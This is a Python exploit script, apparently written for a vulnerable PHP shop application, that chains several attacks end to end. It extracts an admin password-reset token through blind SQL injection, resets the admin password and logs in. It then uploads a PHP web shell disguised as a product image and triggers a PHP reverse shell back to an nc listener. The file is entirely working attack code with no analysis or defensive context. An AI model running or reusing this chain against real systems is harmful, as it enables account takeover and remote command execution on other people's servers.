import requests
import time
import string
import threading
import subprocess

def start_listener(port):
    def listener():
        subprocess.run(["nc", "-lvnp", str(port)])
    thread = threading.Thread(target=listener)
    thread.start()

def ask_reset():
    payload = {
                'username': user_name
            }
    response = requests.post(ask_reset_url, data=payload)
    if response.status_code == 200:
        print("ask success")
        get_token()

def get_token():
    global token
    index = 1  # SQL indexing starts at 1
    while True:
        find_char = False
        for char in char_set:
            payload = {
                'id': f"-1 OR (ASCII(SUBSTRING((SELECT token FROM {table_name} WHERE id={1}), {index}, 1))={ord(char)})"
            }
           
            try:
                response = requests.get(sqlInjection_url, params=payload)
                print(response.status_code)
                if response.status_code in codes:
                    if response.status_code == codes[0]:
                        find_char = True
                        token += char
                        print(token)
                        break
            except requests.RequestException as e:
                print(f"Error making request: {e}")
                break
            
        if not find_char:
            break

        index += 1

    print(f"Token is: {token}")



def change_password(your_password):
    global token

    #reset_password_url = f'{target_ip}/login/doResetPassword.php?token={token}'
    reset_password_url = f'{target_ip}/login/doChangePassword.php'

    data = {'token': token, 'password': your_password}
    response = requests.post(reset_password_url, data=data)
    
    if response.status_code == 200:
        print("Password changed successfully.")
        login(user_name, your_password)
    else:
        print(f"Failed to change password. Status code: {response.status_code}")

def login(username, password):
    global auth_cookie
    with requests.Session() as session:  # Creates a session to persist cookies
        payload = {'username': username, 'password': password}
        response = session.post(login_page_url, data=payload)
        
        if response.status_code == 200:
            print("Logged in successfully.")
            # Print the session cookies
            print("Session Cookies:")
            for cookie in session.cookies:
                print(f"{cookie.name}: {cookie.value}")
                auth_cookie = cookie.value
        else:
            print("Failed to log in.")

def upload_php_file():
    php_code = "<?php system($_REQUEST['cmd']); ?>"
    # The file tuple (filename, file content, content type)
    files = {
        'image': ('shell.phar', php_code, 'application/octet-stream')
    }
    # The rest of the form data
    data = {
        'id': '1',
        'id_user': '1',
        'name': 'Raspberry',
        'description': 'Latest Raspberry Pi 4 Model B with 2/4/8GB RAM raspberry pi 4 BCM2711 Quad core Cortex-A72 ARM v8 1.5GHz Speeder Than Pi 3B',
        'price': '92'
    }

    # Initialize session
    with requests.Session() as session:
        # Set the session cookie
        session.cookies.set('PHPSESSID', auth_cookie)
        
        # Construct the multipart/form-data request with form data and files
        response = session.post(edit_item_url, files=files, data=data)
        
        if response.status_code == 200:
            print("File uploaded successfully.")
        else:
            print("Failed to upload file.")
            print(response.text)

def get_rce():
    host_ip = input("Enter your machine ip: ")
    host_port = input("Enter your machine port")

    start_listener(host_port)

    reverse_shell_payload = f'php -r \'$sock=fsockopen("{host_ip}",{host_port});exec("/bin/sh <&3 >&3 2>&3");\''

    payloads = {'cmd': reverse_shell_payload}

    # nc -lvnp port

    response = requests.get(rce_item_url, params=payloads)

    if response.status_code == 200:
        print("Reverse shell command executed, check your netcat listener.")
    else:
        print("Failed to execute reverse shell command.")


# Start of the script execution
target_ip = input("Enter target ip: ")

ask_reset_url = f'{target_ip}/login/resetPassword.php'
sqlInjection_url = f'{target_ip}/item/viewItem.php'
login_page_url = f'{target_ip}/login/checkLogin.php'
edit_item_url = f'{target_ip}/item/updateItem.php'
rce_item_url = f'{target_ip}/item/image/shell.phar'

char_set = string.ascii_letters + string.digits
table_name = 'user'
user_name = 'admin'
codes = [404, 302]  # Assume 404 is exist, 302 is false
token = ''
auth_cookie = ''

ask_reset()

if token:
    your_password = input("Enter your password you want: ")
    change_password(your_password)
    upload_php_file()
    get_rce()                                                        
